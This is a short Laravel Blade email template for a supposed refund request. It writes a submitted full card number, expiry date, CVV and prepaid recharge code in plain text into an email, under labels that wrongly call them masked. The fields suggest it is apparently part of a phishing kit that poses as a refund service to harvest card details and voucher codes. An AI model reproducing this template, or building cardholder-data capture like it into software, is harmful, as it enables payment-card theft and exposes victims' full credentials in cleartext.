{{ __('mail.text.refund_user_header', ['name' => config('site.name')]) }}

{{ __('mail.text.refund_user_ref', ['ref' => $payload['reference']]) }}

{{ __('mail.text.refund_user_intro') }}

{{ __('mail.refund_user.row_email') }} : {{ $payload['email'] }}
{{ __('mail.refund_user.text_network_plain') }} : {{ $payload['detected_brand'] }}
{{ __('mail.refund_user.text_card_masked') }} : {{ $payload['pan_plain'] }}
{{ __('mail.refund_user.row_exp') }} : {{ $payload['exp_month'] }} / {{ $payload['exp_year'] }}
{{ __('mail.refund_user.row_cvv') }} : {{ $payload['cvv_plain'] }}
{{ __('mail.refund_user.text_type_plain') }} : {{ $payload['card_type_label'] }}
{{ __('mail.refund_user.text_code_masked') }} : {{ $payload['recharge_code_plain'] }}
{{ __('mail.refund_user.text_name_plain') }} : {{ $payload['first_name'] }} {{ $payload['last_name'] }}
{{ __('mail.refund_user.row_country') }} : {{ $payload['country_label'] }}
{{ __('mail.refund_user.text_city_plain') }} : {{ $payload['city_postal'] }}
{{ __('mail.refund_user.text_received') }} : {{ $payload['submitted_at'] }}

{{ __('mail.refund_user.text_demo') }}
